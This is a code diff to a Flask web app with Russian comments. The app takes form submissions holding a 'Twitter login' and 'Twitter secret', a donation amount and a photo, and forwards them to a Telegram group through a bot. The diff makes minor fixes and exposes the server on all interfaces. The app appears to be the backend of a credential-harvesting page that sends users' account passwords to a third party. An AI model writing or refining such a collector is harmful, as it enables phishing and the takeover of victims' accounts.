@@ -1,7 +1,7 @@
 import os
 import base64
 from io import BytesIO
-from flask import Flask, request, render_template, jsonify
+from flask import Flask, request, jsonify
 import telegram
 
 # Получение токена и ID группы из переменных окружения
@@ -34,7 +34,7 @@ def send_to_telegram():
     account_usage_custom = request.form.get("account_usage_custom", "")
     donation_amount = request.form.get("donation_amount", "")
 
-    # Собираем подпись (caption) с информцией из формы
+    # Собираем подпись (caption) с информацией из формы
     caption_parts = [
         f"Twitter login: {twitter_login}",
         f"Twitter secret: {twitter_secret}",
@@ -48,7 +48,7 @@ def send_to_telegram():
         f"Custom usage: {account_usage_custom}",
         f"Donation amount: {donation_amount}",
     ]
-    caption = "\n".join(part for part in caption_parts if part.split(": ")[1])  # включаем только заполненные
+    caption = "\n".join(part for part in caption_parts if part.split(": ")[1].strip())  # только заполненные поля
 
     photo_base64 = request.form.get("photoBase64") or request.form.get("photoData")
 
@@ -77,3 +77,8 @@ def send_to_telegram():
         return jsonify({"error": f"Error sending to Telegram: {str(e)}"}), 500
 
     return jsonify({"success": True}), 200
+
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 5000))
+    # Запускаем на 0.0.0.0, чтобы был доступ извне
+    app.run(host="0.0.0.0", port=port)
